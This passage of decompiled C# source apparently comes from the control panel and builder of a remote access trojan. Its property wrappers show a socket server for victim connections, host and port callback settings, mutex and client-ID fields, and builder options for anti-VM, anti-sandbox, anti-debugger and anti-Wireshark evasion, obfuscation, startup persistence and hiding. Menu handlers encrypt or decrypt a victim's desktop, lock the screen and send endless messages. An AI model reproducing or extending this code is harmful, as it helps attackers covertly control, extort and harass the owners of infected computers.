			if (_addicon != null)
			{
				((Control)_addicon).remove_Click(eventHandler);
			}
			_addicon = value;
			if (_addicon != null)
			{
				((Control)_addicon).add_Click(eventHandler);
			}
		}
	}

	internal virtual PictureBox iconbox
	{
		[DebuggerNonUserCode]
		get
		{
			return _iconbox;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_iconbox = value;
		}
	}

	internal virtual GroupBox GroupBox7
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox7 = value;
		}
	}

	internal virtual GroupBox GroupBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox3 = value;
		}
	}

	internal virtual Button Button5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button5_Click;
			if (_Button5 != null)
			{
				((Control)_Button5).remove_Click(eventHandler);
			}
			_Button5 = value;
			if (_Button5 != null)
			{
				((Control)_Button5).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox ass8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ass8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ass8 = value;
		}
	}

	internal virtual TextBox ass7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ass7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ass7 = value;
		}
	}

	internal virtual TextBox ass6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ass6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ass6 = value;
		}
	}

	internal virtual TextBox ass5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ass5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ass5 = value;
		}
	}

	internal virtual TextBox ass4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ass4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ass4 = value;
		}
	}

	internal virtual TextBox ass3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ass3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ass3 = value;
		}
	}

	internal virtual TextBox ass2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ass2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ass2 = value;
		}
	}

	internal virtual TextBox ass1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ass1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ass1 = value;
		}
	}

	internal virtual Label Label17
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label17 = value;
		}
	}

	internal virtual Label Label16
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label16 = value;
		}
	}

	internal virtual Label Label15
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label15 = value;
		}
	}

	internal virtual Label Label14
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label14 = value;
		}
	}

	internal virtual Label Label13
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label13 = value;
		}
	}

	internal virtual Label Label12
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label12 = value;
		}
	}

	internal virtual Label Label11
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label11 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual CheckBox CBass
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBass;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CBass_CheckedChanged;
			if (_CBass != null)
			{
				_CBass.remove_CheckedChanged(eventHandler);
			}
			_CBass = value;
			if (_CBass != null)
			{
				_CBass.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual GroupBox GroupBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox1 = value;
		}
	}

	internal virtual GroupBox GroupBox14
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox14 = value;
		}
	}

	internal virtual Label Label24
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label24;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label24 = value;
		}
	}

	internal virtual CheckBox SBSLEEP
	{
		[DebuggerNonUserCode]
		get
		{
			return _SBSLEEP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = SBSLEEP_CheckedChanged;
			if (_SBSLEEP != null)
			{
				_SBSLEEP.remove_CheckedChanged(eventHandler);
			}
			_SBSLEEP = value;
			if (_SBSLEEP != null)
			{
				_SBSLEEP.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label8 = value;
		}
	}

	internal virtual NumericUpDown sleep
	{
		[DebuggerNonUserCode]
		get
		{
			return _sleep;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_sleep = value;
		}
	}

	internal virtual Label Label26
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label26;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label26 = value;
		}
	}

	internal virtual Label Label27
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label27;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label27 = value;
		}
	}

	internal virtual NumericUpDown recdelay
	{
		[DebuggerNonUserCode]
		get
		{
			return _recdelay;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_recdelay = value;
		}
	}

	internal virtual GroupBox GroupBox8
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox8 = value;
		}
	}

	internal virtual CheckBox ATAM
	{
		[DebuggerNonUserCode]
		get
		{
			return _ATAM;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ATAM = value;
		}
	}

	internal virtual CheckBox OPT
	{
		[DebuggerNonUserCode]
		get
		{
			return _OPT;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_OPT = value;
		}
	}

	internal virtual CheckBox STEN
	{
		[DebuggerNonUserCode]
		get
		{
			return _STEN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_STEN = value;
		}
	}

	internal virtual CheckBox CBRAND
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBRAND;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CBRAND = value;
		}
	}

	internal virtual CheckBox Obfu
	{
		[DebuggerNonUserCode]
		get
		{
			return _Obfu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Obfu = value;
		}
	}

	internal virtual CheckBox ANIL
	{
		[DebuggerNonUserCode]
		get
		{
			return _ANIL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ANIL = value;
		}
	}

	internal virtual ComboBox CBPROPRIO
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBPROPRIO;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CBPROPRIO = value;
		}
	}

	internal virtual CheckBox CBHIDEE
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBHIDEE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CBHIDEE = value;
		}
	}

	internal virtual CheckBox CBPROPRI
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBPROPRI;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CheckBox4_CheckedChanged;
			if (_CBPROPRI != null)
			{
				_CBPROPRI.remove_CheckedChanged(eventHandler);
			}
			_CBPROPRI = value;
			if (_CBPROPRI != null)
			{
				_CBPROPRI.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual CheckBox ANTIE
	{
		[DebuggerNonUserCode]
		get
		{
			return _ANTIE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ANTIE = value;
		}
	}

	internal virtual CheckBox ANTID
	{
		[DebuggerNonUserCode]
		get
		{
			return _ANTID;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ANTID = value;
		}
	}

	internal virtual CheckBox ANTIW
	{
		[DebuggerNonUserCode]
		get
		{
			return _ANTIW;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ANTIW = value;
		}
	}

	internal virtual CheckBox ANTISB
	{
		[DebuggerNonUserCode]
		get
		{
			return _ANTISB;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ANTISB = value;
		}
	}

	internal virtual CheckBox ANTIVM
	{
		[DebuggerNonUserCode]
		get
		{
			return _ANTIVM;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ANTIVM = value;
		}
	}

	internal virtual GroupBox GroupBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox4 = value;
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label10
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label10 = value;
		}
	}

	internal virtual Label Label9
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label9 = value;
		}
	}

	internal virtual TextBox clientidtextbox
	{
		[DebuggerNonUserCode]
		get
		{
			return _clientidtextbox;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_clientidtextbox = value;
		}
	}

	internal virtual TextBox mutextxtbox
	{
		[DebuggerNonUserCode]
		get
		{
			return _mutextxtbox;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_mutextxtbox = value;
		}
	}

	internal virtual GroupBox GroupBox6
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox6 = value;
		}
	}

	internal virtual ListView hostsports
	{
		[DebuggerNonUserCode]
		get
		{
			return _hostsports;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_hostsports = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader14
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader14 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader15
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader15 = value;
		}
	}

	internal virtual Button Addhosts
	{
		[DebuggerNonUserCode]
		get
		{
			return _Addhosts;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Addhosts_Click;
			if (_Addhosts != null)
			{
				((Control)_Addhosts).remove_Click(eventHandler);
			}
			_Addhosts = value;
			if (_Addhosts != null)
			{
				((Control)_Addhosts).add_Click(eventHandler);
			}
		}
	}

	internal virtual NumericUpDown Porttxtbox
	{
		[DebuggerNonUserCode]
		get
		{
			return _Porttxtbox;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Porttxtbox = value;
		}
	}

	internal virtual TextBox hosttxtbox
	{
		[DebuggerNonUserCode]
		get
		{
			return _hosttxtbox;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_hosttxtbox = value;
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip4 = value;
		}
	}

	internal virtual ToolStripMenuItem AddToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _AddToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = AddToolStripMenuItem1_Click;
			if (_AddToolStripMenuItem1 != null)
			{
				((ToolStripItem)_AddToolStripMenuItem1).remove_Click(eventHandler);
			}
			_AddToolStripMenuItem1 = value;
			if (_AddToolStripMenuItem1 != null)
			{
				((ToolStripItem)_AddToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem EditToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _EditToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = EditToolStripMenuItem_Click;
			if (_EditToolStripMenuItem != null)
			{
				((ToolStripItem)_EditToolStripMenuItem).remove_Click(eventHandler);
			}
			_EditToolStripMenuItem = value;
			if (_EditToolStripMenuItem != null)
			{
				((ToolStripItem)_EditToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RemoveToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RemoveToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RemoveToolStripMenuItem1_Click;
			if (_RemoveToolStripMenuItem1 != null)
			{
				((ToolStripItem)_RemoveToolStripMenuItem1).remove_Click(eventHandler);
			}
			_RemoveToolStripMenuItem1 = value;
			if (_RemoveToolStripMenuItem1 != null)
			{
				((ToolStripItem)_RemoveToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ClearListToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ClearListToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ClearListToolStripMenuItem1_Click;
			if (_ClearListToolStripMenuItem1 != null)
			{
				((ToolStripItem)_ClearListToolStripMenuItem1).remove_Click(eventHandler);
			}
			_ClearListToolStripMenuItem1 = value;
			if (_ClearListToolStripMenuItem1 != null)
			{
				((ToolStripItem)_ClearListToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem EncryptToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _EncryptToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_EncryptToolStripMenuItem = value;
		}
	}

	internal virtual ToolStripMenuItem EncryptDESKTOPToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _EncryptDESKTOPToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = EncryptDESKTOPToolStripMenuItem_Click;
			if (_EncryptDESKTOPToolStripMenuItem != null)
			{
				((ToolStripItem)_EncryptDESKTOPToolStripMenuItem).remove_Click(eventHandler);
			}
			_EncryptDESKTOPToolStripMenuItem = value;
			if (_EncryptDESKTOPToolStripMenuItem != null)
			{
				((ToolStripItem)_EncryptDESKTOPToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem DecryptDESKTOPToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _DecryptDESKTOPToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DecryptDESKTOPToolStripMenuItem_Click;
			if (_DecryptDESKTOPToolStripMenuItem != null)
			{
				((ToolStripItem)_DecryptDESKTOPToolStripMenuItem).remove_Click(eventHandler);
			}
			_DecryptDESKTOPToolStripMenuItem = value;
			if (_DecryptDESKTOPToolStripMenuItem != null)
			{
				((ToolStripItem)_DecryptDESKTOPToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem LockScreenToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _LockScreenToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LockScreenToolStripMenuItem = value;
		}
	}

	internal virtual ToolStripMenuItem LockToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _LockToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = LockToolStripMenuItem_Click;
			if (_LockToolStripMenuItem != null)
			{
				((ToolStripItem)_LockToolStripMenuItem).remove_Click(eventHandler);
			}
			_LockToolStripMenuItem = value;
			if (_LockToolStripMenuItem != null)
			{
				((ToolStripItem)_LockToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem UnlockToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _UnlockToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = UnlockToolStripMenuItem_Click;
			if (_UnlockToolStripMenuItem != null)
			{
				((ToolStripItem)_UnlockToolStripMenuItem).remove_Click(eventHandler);
			}
			_UnlockToolStripMenuItem = value;
			if (_UnlockToolStripMenuItem != null)
			{
				((ToolStripItem)_UnlockToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem FunToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _FunToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_FunToolStripMenuItem = value;
		}
	}

	internal virtual ToolStripMenuItem StartInfinityMessagesToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _StartInfinityMessagesToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = StartInfinityMessagesToolStripMenuItem_Click;
			if (_StartInfinityMessagesToolStripMenuItem != null)
			{
				((ToolStripItem)_StartInfinityMessagesToolStripMenuItem).remove_Click(eventHandler);
			}
			_StartInfinityMessagesToolStripMenuItem = value;
			if (_StartInfinityMessagesToolStripMenuItem != null)
			{
				((ToolStripItem)_StartInfinityMessagesToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem StopInfinityMessagesToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _StopInfinityMessagesToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = StopInfinityMessagesToolStripMenuItem_Click;
			if (_StopInfinityMessagesToolStripMenuItem != null)
			{
				((ToolStripItem)_StopInfinityMessagesToolStripMenuItem).remove_Click(eventHandler);
			}
			_StopInfinityMessagesToolStripMenuItem = value;
			if (_StopInfinityMessagesToolStripMenuItem != null)
			{
				((ToolStripItem)_StopInfinityMessagesToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	public virtual SocketServer s
	{
		[DebuggerNonUserCode]
		get
		{
			return _s;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			SocketServer.DisConnectedEventHandler value2 = disconnected;
			SocketServer.ConnectedEventHandler value3 = connect;
			SocketServer.DataEventHandler value4 = data;
			if (_s != null)
			{
				_s.DisConnected -= value2;
				_s.Connected -= value3;
				_s.Data -= value4;
			}
			_s = value;
			if (_s != null)
			{
				_s.DisConnected += value2;
				_s.Connected += value3;
				_s.Data += value4;
			}
		}
	}

	public FrmMAINGR()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		__ENCAddToList(this);
		URC = Convert.ToBase64String(Functions.Compress(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\URC.dll")));
		s = new SocketServer();
		PL = new List<string>();
		GeoIP = new GetcountryGR(Application.get_StartupPath() + "\\GeoIP.dat");
		culture = CultureInfo.CurrentCulture.EnglishName;
		country = checked(culture.Substring(culture.IndexOf('(') + 1, culture.LastIndexOf(')') - culture.IndexOf('(') - 1));
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected O, but got Unknown
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0156: Expected O, but got Unknown
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Expected O, but got Unknown
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		//IL_016c: Expected O, but got Unknown
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0177: Expected O, but got Unknown
		//IL_0178: Unknown result type (might be due to invalid IL or missing references)
		//IL_0182: Expected O, but got Unknown
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		//IL_018d: Expected O, but got Unknown
		//IL_018e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0198: Expected O, but got Unknown
		//IL_0199: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a3: Expected O, but got Unknown
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Expected O, but got Unknown
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Expected O, but got Unknown
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Expected O, but got Unknown
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cf: Expected O, but got Unknown
		//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01da: Expected O, but got Unknown
		//IL_01db: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e5: Expected O, but got Unknown
		//IL_01e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f0: Expected O, but got Unknown
		//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Expected O, but got Unknown
		//IL_01fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0206: Expected O, but got Unknown
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Expected O, but got Unknown
		//IL_0212: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Expected O, but got Unknown
		//IL_021d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0227: Expected O, but got Unknown
		//IL_0228: Unknown result type (might be due to invalid IL or missing references)
		//IL_0232: Expected O, but got Unknown
		//IL_0233: Unknown result type (might be due to invalid IL or missing references)
		//IL_023d: Expected O, but got Unknown
		//IL_023e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0248: Expected O, but got Unknown
		//IL_0249: Unknown result type (might be due to invalid IL or missing references)
		//IL_0253: Expected O, but got Unknown
